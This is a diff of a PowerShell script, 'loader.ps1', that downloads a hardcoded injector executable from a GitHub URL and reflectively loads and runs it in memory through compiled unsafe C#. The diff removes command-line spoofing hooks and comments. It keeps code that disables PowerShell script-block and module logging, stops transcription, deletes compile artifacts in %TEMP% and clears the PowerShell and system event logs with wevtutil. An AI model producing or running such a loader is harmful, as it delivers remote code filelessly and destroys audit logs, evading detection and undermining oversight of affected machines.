@@ -1,20 +1,12 @@
-# loader.ps1 â€” full reflective PE loader with command line spoofing
-# usage: .\loader.ps1 -Url "https://..." -DllPath "C:\dll.dll" -TargetProc "javaw.exe"
-
-param(
-    [Parameter(Mandatory=$true)][string]$Url,
-    [Parameter(Mandatory=$true)][string]$DllPath,
-    [Parameter(Mandatory=$true)][string]$TargetProc
-)
+# loader.ps1 - full reflective PE loader, no logs
+# usage: .\loader.ps1   (everything hardcoded)
 
 # ---- anti-log setup ----
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# stop any active transcription
 try { Stop-Transcript | Out-Null } catch {}
 
 if ($isAdmin) {
-    # remember original logging policy so we can restore it later
     $script:origSBL = $null
     $script:origML  = $null
     $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
@@ -22,7 +14,6 @@ if ($isAdmin) {
     try { $script:origSBL = (Get-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -ErrorAction Stop).EnableScriptBlockLogging } catch {}
     try { $script:origML  = (Get-ItemProperty -Path $mlPath -Name "EnableModuleLogging"   -ErrorAction Stop).EnableModuleLogging   } catch {}
 
-    # kill scriptblock + module logging policy so nothing new gets written
     try {
         New-Item -Path $sbPath -Force | Out-Null
         Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord
@@ -32,13 +23,12 @@ if ($isAdmin) {
     } catch {}
 }
 
-# snapshot %TEMP% so we can diff away CodeDom compile artifacts later
 $tempBefore = Get-ChildItem $env:TEMP -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent","Mozilla/5.0")
-$exeBytes = $wc.DownloadData($Url)
+$exeBytes = $wc.DownloadData("https://raw.githubusercontent.com/Brjdhehd/rdinjector/main/TXCInjector.exe")
 Write-Host "[+] downloaded $($exeBytes.Length) bytes"
 
 $cs = @'
@@ -62,20 +52,6 @@ public unsafe class ReflectiveExeLoader
     static extern IntPtr CreateThread(IntPtr attr, UIntPtr stack, IntPtr start, IntPtr param, int flags, out int tid);
     [DllImport("kernel32.dll")]
     static extern uint WaitForSingleObject(IntPtr h, int timeout);
-
-    // pinned delegate refs so GC never collects our hooks mid-run
-    static GetCmdLineADelegate s_hookA;
-    static GetCmdLineWDelegate s_hookW;
-    static IntPtr s_fakeCmdLineA = IntPtr.Zero;
-    static IntPtr s_fakeCmdLineW = IntPtr.Zero;
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr GetCmdLineADelegate();
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate IntPtr GetCmdLineWDelegate();
-
-    static IntPtr HookedGetCommandLineA() { return s_fakeCmdLineA; }
-    static IntPtr HookedGetCommandLineW() { return s_fakeCmdLineW; }
 
     static uint RvaToOffset(byte[] pe, int peOff, ushort numSec, int secStart, uint rva)
     {
@@ -106,7 +82,7 @@ public unsafe class ReflectiveExeLoader
         return Encoding.ASCII.GetString(buf, offset, end - offset);
     }
 
-    public static int LoadAndRun(byte[] exeBytes, string cmdLine)
+    public static int LoadAndRun(byte[] exeBytes)
     {
         int peOff     = BitConverter.ToInt32(exeBytes, 0x3C);
         ushort machine = BitConverter.ToUInt16(exeBytes, peOff + 4);
@@ -130,10 +106,8 @@ public unsafe class ReflectiveExeLoader
 
         fixed (byte* srcBase = exeBytes)
         {
-            // headers
             Buffer.MemoryCopy(srcBase, (void*)mem, sizeOfHeaders, sizeOfHeaders);
 
-            // sections
             for (int i = 0; i < numSec; i++)
             {
                 int so = secStart + i * 40;
@@ -181,7 +155,7 @@ public unsafe class ReflectiveExeLoader
                             {
                                 case 10: *(ulong*)patchVa += (ulong)delta; break;   // DIR64
                                 case 3:  *(uint*) patchVa += (uint) delta; break;   // HIGHLOW
-                                default: break;                                     // ABSOLUTE = pad, skip
+                                default: break;
                             }
                         }
                         cur += blockSize;
@@ -198,9 +172,9 @@ public unsafe class ReflectiveExeLoader
                 long cur = mem.ToInt64() + importRva;
                 while (true)
                 {
-                    uint origThunkRva = *(uint*)cur;          // INT (OriginalFirstThunk)
-                    uint nameRva      = *(uint*)(cur + 12);   // dll name
-                    uint iatRva       = *(uint*)(cur + 16);   // FirstThunk (IAT)
+                    uint origThunkRva = *(uint*)cur;
+                    uint nameRva      = *(uint*)(cur + 12);
+                    uint iatRva       = *(uint*)(cur + 16);
 
                     if (nameRva == 0 || iatRva == 0) break;
 
@@ -244,72 +218,6 @@ public unsafe class ReflectiveExeLoader
                 }
                 Console.WriteLine("[*] imports done");
             }
-
-            // ---- build fake command line ----
-            byte[] cmdA = Encoding.ASCII.GetBytes(cmdLine);
-            byte[] cmdW = Encoding.Unicode.GetBytes(cmdLine);
-            s_fakeCmdLineA = Marshal.AllocHGlobal(cmdA.Length + 1);
-            s_fakeCmdLineW = Marshal.AllocHGlobal(cmdW.Length + 2);
-            Marshal.Copy(cmdA, 0, s_fakeCmdLineA, cmdA.Length);
-            Marshal.WriteByte(s_fakeCmdLineA, cmdA.Length, 0);
-            Marshal.Copy(cmdW, 0, s_fakeCmdLineW, cmdW.Length);
-            Marshal.WriteInt16(s_fakeCmdLineW, cmdW.Length, 0);
-
-            // pin hooks so GC can't move/free them
-            s_hookA = new GetCmdLineADelegate(HookedGetCommandLineA);
-            s_hookW = new GetCmdLineWDelegate(HookedGetCommandLineW);
-            IntPtr hookAAddr = Marshal.GetFunctionPointerForDelegate(s_hookA);
-            IntPtr hookWAddr = Marshal.GetFunctionPointerForDelegate(s_hookW);
-
-            Console.WriteLine("[*] cmdline spoof: \"" + cmdLine + "\"");
-
-            // ---- walk INT by NAME to find & replace GetCommandLineA/W in IAT ----
-            if (importRva != 0)
-            {
-                long cur = mem.ToInt64() + importRva;
-                while (true)
-                {
-                    uint origThunkRva = *(uint*)cur;
-                    uint nameRva      = *(uint*)(cur + 12);
-                    uint iatRva       = *(uint*)(cur + 16);
-                    if (nameRva == 0 || iatRva == 0) break;
-                    if (origThunkRva == 0) { cur += 20; continue; }
-
-                    int nameOff = (int)RvaToOffset(exeBytes, peOff, numSec, secStart, nameRva);
-                    if (nameOff <= 0) break;
-                    string dllName = ReadCString(exeBytes, nameOff).ToLower();
-
-                    if (dllName.Contains("kernel32")) {
-                        long intVa  = RvaToVa(mem, exeBytes, numSec, secStart, origThunkRva);
-                        long iatVa  = RvaToVa(mem, exeBytes, numSec, secStart, iatRva);
-                        if (intVa == 0 || iatVa == 0) { cur += 20; continue; }
-
-                        for (int idx = 0; ; idx++)
-                        {
-                            ulong thunkName = *(ulong*)(intVa + idx * 8);
-                            if (thunkName == 0) break;
-                            if ((thunkName & 0x8000000000000000UL) != 0) continue; // ordinal, skip
-
-                            long fnameVa = RvaToVa(mem, exeBytes, numSec, secStart, (uint)(thunkName & 0xFFFFFFFF));
-                            if (fnameVa == 0) continue;
-                            // +2 skips the WORD hint field of IMAGE_IMPORT_BY_NAME
-                            string fnName = ReadCStringAt((byte*)(fnameVa + 2));
-
-                            if (fnName == "GetCommandLineA")
-                            {
-                                *(ulong*)(iatVa + idx * 8) = (ulong)hookAAddr.ToInt64();
-                                Console.WriteLine("[*] hooked GetCommandLineA");
-                            }
-                            else if (fnName == "GetCommandLineW")
-                            {
-                                *(ulong*)(iatVa + idx * 8) = (ulong)hookWAddr.ToInt64();
-                                Console.WriteLine("[*] hooked GetCommandLineW");
-                            }
-                        }
-                    }
-                    cur += 20;
-                }
-            }
         }
 
         // ---- per-section protections ----
@@ -330,7 +238,7 @@ public unsafe class ReflectiveExeLoader
 
             int prot;
             if (x && w)           prot = 0x40; // PAGE_EXECUTE_READWRITE
-            else if (x)           prot = 0x20; // PAGE_EXECUTE_READ (x64 always readable)
+            else if (x)           prot = 0x20; // PAGE_EXECUTE_READ
             else if (r && w)      prot = 0x04; // PAGE_READWRITE
             else                  prot = 0x02; // PAGE_READONLY
 
@@ -354,13 +262,6 @@ public unsafe class ReflectiveExeLoader
         Console.WriteLine("[+] execution finished");
         return 0;
     }
-
-    static unsafe string ReadCStringAt(byte* ptr)
-    {
-        int len = 0;
-        while (ptr[len] != 0) len++;
-        return Encoding.ASCII.GetString(ptr, len);
-    }
 }
 '@
 
@@ -369,15 +270,13 @@ $cparams.CompilerOptions = "/unsafe"
 $cparams.ReferencedAssemblies.AddRange(@("System.dll", "System.Core.dll"))
 Add-Type -TypeDefinition $cs -CompilerParameters $cparams
 
-$cmdLine = "`"TXCInjector.exe`" `"$DllPath`" `"$TargetProc`""
 Write-Host "[*] running..."
 
-$result = [ReflectiveExeLoader]::LoadAndRun($exeBytes, $cmdLine)
+$result = [ReflectiveExeLoader]::LoadAndRun($exeBytes)
 
 if ($result -eq 0) { Write-Host "[+] success" } else { Write-Host "[-] exit code $result" }
 
 # ---- log cleanup before exit ----
-# sweep CodeDom temp artifacts created by Add-Type this session
 try {
     $tempAfter = Get-ChildItem $env:TEMP -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
     $newFiles = Compare-Object $tempBefore $tempAfter | Where-Object SideIndicator -eq "=>" | Select-Object -ExpandProperty InputObject
@@ -385,7 +284,6 @@ try {
 } catch {}
 
 if ($isAdmin) {
-    # wipe powershell + system logs so nothing from this run or before survives
     wevtutil cl "Windows PowerShell" 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
@@ -401,8 +299,4 @@ if ($isAdmin) {
     } catch {}
 }
 
-# kill host — mapped exe runs on a non-primary thread so its exit()
-# only ends the thread, not us. terminate explicitly.
 [Environment]::Exit($result)
-
-
